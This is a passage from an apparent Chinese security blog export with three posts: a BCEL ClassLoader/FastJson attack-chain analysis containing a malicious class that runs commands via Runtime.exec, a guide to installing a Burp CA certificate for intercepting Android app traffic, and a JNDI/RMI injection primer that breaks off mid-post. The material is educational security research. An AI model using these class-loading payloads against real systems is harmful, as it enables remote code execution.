    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>需要提前了解什么是<code>类加载机制</code></p>
</blockquote>
<p>认真看完了<code>ClassLoader</code>，就想着写一篇与之相关的的攻击链分析。</p>
<span id="more"></span>

<h1 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h1><p>想要了解这个攻击链，得先了解什么是<code>BCEL ClassLoader</code> 。</p>
<p><a href="https://commons.apache.org/proper/commons-bcel/" title="BCEL">BCEL</a>（<code>Apache Commons BCEL™</code>）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名<code>org.apache.bcel.util.ClassLoader</code>为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 。</p>
<h1 id="BCEL攻击原理"><a href="#BCEL攻击原理" class="headerlink" title="BCEL攻击原理"></a>BCEL攻击原理</h1><p>截取BCEL的ClassLoader类部分代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="string">&quot;$$BCEL$$&quot;</span>.length());</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">            <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            clazz = parser.parse();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            var8.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line">        <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(), (<span class="type">byte</span>)<span class="number">7</span>);</span><br><span class="line">        <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(), (<span class="type">byte</span>)<span class="number">1</span>);</span><br><span class="line">        name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由以上源码可以看出BCEL的类加载器在解析类名时会对ClassName中有<code>$$BCEL$$</code>标识的类做特殊处理。</p>
<p>当BCEL的<code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>加载一个类名中带有<code>$$BCEL$$</code>的类时会截取出<code>$$BCEL$$</code>后面的字符串，然后使用<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用<code>defineClass</code>注册解码后的类，一旦该类被加载就会触发类中的恶意代码。</p>
<h1 id="利用BCEL进行命令执行"><a href="#利用BCEL进行命令执行" class="headerlink" title="利用BCEL进行命令执行"></a>利用BCEL进行命令执行</h1><p>构造恶意类<strong>TestBCELClass</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCELClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span>  <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;calc 12345678901234567&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Linux&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;curl localhost:9999/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在对其使用BCEL编码com.anbai.sec.classloader.TestBCELClass类字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bcelEncode</span><span class="params">(File classFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(FileUtils.readFileToByteArray(classFile), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一定基础的朋友就会发现，只是注入了类名和类加载器并不足以触发类加载，导致命令执行的关键问题就在于FastJson会自动调用getter方法，<code>org.apache.commons.dbcp.BasicDataSource</code>本没有<code>connection</code>成员变量，但有一个<code>getConnection()</code>方法，按理来讲应该不会调用<code>getConnection()</code>方法，但是FastJson会通过<code>getConnection()</code>这个方法名计算出一个名为<code>connection</code>的field，因此FastJson最终还是调用了<code>getConnection()</code>方法。</p>
<p>当<code>getConnection()</code>方法被调用时就会使用注入进来的<code>org.apache.bcel.util.ClassLoader</code>类加载器加载注入进来恶意类字节码</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_DR1kCydpgI.png"></p>
<p>注意：Java将BCEL升级到6.0时用的是一个删除了ClassLoader版本的BCEL，所以这个利用链只能用来学习。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>BCEL</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>APK流量转发</title>
    <url>/APP/APK%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为一个渗透人，不仅要日WEB还得日app和小程序，由此就写了此文</p>
<span id="more"></span>

<h1 id="APK流量转发"><a href="#APK流量转发" class="headerlink" title="APK流量转发"></a>APK流量转发</h1><p>实现安卓APP全局&#x2F;单个APP的代理</p>
<p>需要的工具有：</p>
<ul>
<li>proxifier</li>
<li>clash</li>
<li>夜神模拟器</li>
</ul>
<h1 id="安装BurpSuite证书"><a href="#安装BurpSuite证书" class="headerlink" title="安装BurpSuite证书"></a>安装BurpSuite证书</h1><p>先在Proxy→Options→Add页面新建局域网代理端口：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>点击Import &#x2F; expoet CA certificate 选择Certificate in DER format导出CA证书并保存到某一个文件夹：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>然后将CA证书上传到VPS并在该目录下用Python开启http服务：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_2.png"></p>
<p>启动夜神模拟器，打开内置游览器，</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_4.png"></p>
<p>下载证书至Download文件夹下（默认就是Download目录）：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_5.png"></p>
<p>回到本机中，打开CMD窗口，cd命令进入下载的夜神模拟器的bin目录下：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_6.png"></p>
<p>nox_adb.exe即为夜神模拟器adb模式端口，使用nox_adb.exe执行以下命令（分布执行）：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\nox_adb.exe root</span><br><span class="line">.\nox_adb.exe remount</span><br><span class="line">.\nox_adb.exe shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_7.png"></p>
<p>此时在此处输入：cd sdcard&#x2F;Download</p>
<p>执行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /sdcard/Download/</span><br><span class="line"><span class="built_in">mv</span> CA.der <span class="number">9</span>a5ba575.<span class="number">0</span></span><br><span class="line"><span class="built_in">mv</span> <span class="number">9</span>a5ba575.<span class="number">0</span> /system/etc/security/cacerts/</span><br><span class="line">chmod <span class="number">644</span> /system/etc/security/cacerts/<span class="number">9</span>a5ba575.<span class="number">0</span></span><br></pre></td></tr></table></figure>


<p>PS：<code>此时后缀名一定要是xxx.der不是的话要重新生成证书并保存到htdocs文件夹！</code></p>
<h1 id="安装-配置Clash"><a href="#安装-配置Clash" class="headerlink" title="安装+配置Clash"></a>安装+配置Clash</h1><p>下载<a href="https://github.com/Kr328/ClashForAndroid/tags">clash</a></p>
<p>下载好之后在夜神模拟器中导入apk文件：</p>
<p>直接拖入即可</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_8.png"></p>
<p>在本机中新建一个yaml文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mixed-port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">global</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="comment"># http</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.106</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">    <span class="comment"># username: username</span></span><br><span class="line">    <span class="comment"># password: password</span></span><br><span class="line">    <span class="comment"># tls: true # https</span></span><br><span class="line">    <span class="comment"># skip-cert-verify: true</span></span><br><span class="line">    <span class="comment"># sni: custom.com</span></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Proxy</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="comment"># disable-udp: true</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http</span></span><br></pre></td></tr></table></figure>


<p>192.168.0.106和后面的端口改为自己的IP和burp监听的端口</p>
<p>再把此文件拖入夜神模拟器中</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_9.png"></p>
<p>打开clash，点击配置</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_10.png"></p>
<p>点+号</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_11.png"></p>
<p>将刚刚写的yaml文件导入</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_12.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_13.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_14.png"></p>
<p>之后在启动代理</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_15.png"></p>
<p>点击代理</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_16.png"></p>
<p>选择http，按下闪电按钮</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_17.png"></p>
<p>此时就可以抓取APP全部流量包了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_18.png"></p>
<h2 id="抓取单个APP流量包"><a href="#抓取单个APP流量包" class="headerlink" title="抓取单个APP流量包"></a>抓取单个APP流量包</h2><p>选关闭代理，再点设备</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_19.png"></p>
<p>选择网络</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_20.png"></p>
<p>单击<code>访问控制模式</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_21.png"></p>
<p>选择仅运行已选择的应用</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_22.png"></p>
<p>访问控制应用包列表</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_23.png"></p>
<p>即可抓取单个APP的流量包</p>
<p>同理，要渗透小程序时，就仅通过微信即可</p>
]]></content>
      <categories>
        <category>APP</category>
      </categories>
      <tags>
        <tag>APP渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析JNDI注入</title>
    <url>/JNID%E6%B3%A8%E5%85%A5/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考了几个师傅的文章，写了篇分析。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown79711298_p0.png"></p>
<span id="more"></span>

<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>JNDI(<code>Java Naming and Directory Interface</code>,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
<p>JNDI(<code>Java Naming and Directory Interface</code>)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
<p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x的注册表、RMI、DSML v1&amp;v2、NIS。</p>
<p>以上是一段百度wiki的描述。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
<h2 id="JNID结构"><a href="#JNID结构" class="headerlink" title="JNID结构"></a>JNID结构</h2><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h2><p>命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务</p>
<h2 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h2><p>目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象，这么说可能不太好理解，我们举个例子：比如你要在某个学校里里找某个人，那么会通过：年级-&gt;班级-&gt;姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。</p>
<p>其实，仔细一琢磨就会感觉其实命名服务与目录服务的本质是一样的，都是通过键来查找对象，只不过目录服务的键要灵活且复杂一点。</p>
<p>这些命名&#x2F;目录服务提供者:</p>
<ul>
<li>RMI (JAVA远程方法调用)</li>
<li>LDAP (轻量级目录访问协议)</li>
<li>CORBA (公共对象请求代理体系结构)</li>
<li>DNS (域名服务)</li>
</ul>
<p>到此就可以知道了，实现JNID注入有2种方式，一种是RMI的动态类加载，一直是利用LDAP服务。</p>
<p>但在此之前还要了解两个类</p>
<h1 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialContext() </span><br><span class="line">构建一个初始上下文。  </span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy) </span><br><span class="line">构造一个初始上下文，并选择不初始化它。  </span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br><span class="line">使用提供的环境构建初始上下文。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure>


<p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p>
<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">  将名称绑定到对象。 </span><br><span class="line">list(String name) </span><br><span class="line">  枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">lookup(String name) </span><br><span class="line">  检索命名对象。 </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">  将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class="line">unbind(String name) </span><br><span class="line">  取消绑定命名对象。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h1><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
<h2 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference(String className) </span><br><span class="line">  为类名为“className”的对象构造一个新的引用。  </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">  为类名为“className”的对象和地址构造一个新引用。  </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">  为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  </span><br><span class="line">Reference(String className, String factory, String factoryLocation) </span><br><span class="line">  为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>
<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>
<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>
<h2 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span> </span><br><span class="line">  将地址添加到索引posn的地址列表中。  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(RefAddr addr)</span> </span><br><span class="line">  将地址添加到地址列表的末尾。  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> </span><br><span class="line">  从此引用中删除所有地址。  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">  检索索引posn上的地址。  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(String addrType)</span> </span><br><span class="line">  检索地址类型为“addrType”的第一个地址。  </span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span> </span><br><span class="line">  检索本参考文献中地址的列举。  </span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span> </span><br><span class="line">  检索引用引用的对象的类名。  </span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span> </span><br><span class="line">  检索此引用引用的对象的工厂位置。  </span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span> </span><br><span class="line">  检索此引用引用对象的工厂的类名。    </span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">  从地址列表中删除索引posn上的地址。  </span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> </span><br><span class="line">  检索此引用中的地址数。  </span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span> </span><br><span class="line">  生成此引用的字符串表示形式。  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>; </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="JNDI注入-RMI实现攻击"><a href="#JNDI注入-RMI实现攻击" class="headerlink" title="JNDI注入+RMI实现攻击"></a>JNDI注入+RMI实现攻击</h1><p>下面还是来看几段代码，来做一个分析具体的攻击流程。</p>
<h2 id="RMIServer代码："><a href="#RMIServer代码：" class="headerlink" title="RMIServer代码："></a>RMIServer代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;obj&quot;</span>,referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="RMIClient代码："><a href="#RMIClient代码：" class="headerlink" title="RMIClient代码："></a>RMIClient代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/obj&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>下面还需要一段执行命令的代码，挂载在web页面上让server端去请求。</p>
